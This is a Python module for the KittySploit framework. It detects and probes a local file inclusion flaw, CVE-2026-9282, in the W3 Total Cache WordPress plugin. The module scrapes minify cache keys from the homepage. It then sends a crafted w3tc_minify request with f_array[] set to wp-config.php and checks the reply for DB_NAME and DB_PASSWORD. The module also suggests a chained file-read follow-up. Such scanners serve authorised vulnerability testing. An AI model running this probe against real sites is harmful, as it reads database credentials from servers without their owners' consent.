#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""W3 Total Cache <= 2.9.4 minify LFI (CVE-2026-9282)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "w3-total-cache"
_VULN_HIGH = (2, 9, 4)
_MINIFY_RE = re.compile(
    r"/wp-content/cache/minify/([a-f0-9]+)\.([^./\"]+)\.include(?:-(?:footer|body))?\.[a-f0-9]+\.(?:css|js)"
)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "W3 Total Cache CVE-2026-9282 minify LFI detect",
        "description": (
            "Detects manual minify cache URLs and probes f_array[] traversal for wp-config markers."
        ),
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": "CVE-2026-9282",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-9282"],
        "modules": ["auxiliary/admin/http/w3_total_cache_cve_2026_9282_file_read"],
        "tags": ["web", "scanner", "wordpress", "w3-total-cache", "lfi", "cve-2026-9282"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": ["auxiliary/admin/http/w3_total_cache_cve_2026_9282_file_read"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    lfi_probe = OptBool(True, "Attempt wp-config.php read via minify", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        base = self.wp_normalize_base_path(self.base_path or "/")
        version = self.wp_plugin_version(_PLUGIN, base) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        home = self.http_request(method="GET", path=self._join("/"), allow_redirects=True)
        body = home.text or "" if home else ""
        if "/wp-content/cache/minify/" not in body:
            return False
        m = _MINIFY_RE.search(body)
        if not m:
            self.set_info(
                severity="high",
                reason="W3TC minify cache present (keys not scraped from HTML)",
                cve="CVE-2026-9282",
            )
            return True
        theme_key, template_key = m.group(1), m.group(2)
        if not self.lfi_probe:
            self.set_info(severity="high", reason="W3TC minify keys extracted", cve="CVE-2026-9282")
            return True
        lfi = self.http_request(
            method="GET",
            path=self._join("/"),
            params={"w3tc_minify": f"{theme_key}.{template_key}.include.{theme_key}.css", "f_array[]": "wp-config.php"},
            allow_redirects=False,
        )
        txt = lfi.text or "" if lfi else ""
        if "DB_NAME" in txt and "DB_PASSWORD" in txt:
            self.set_info(
                severity="high",
                reason="Minify traversal returned wp-config markers",
                cve="CVE-2026-9282",
            )
            return True
        return False
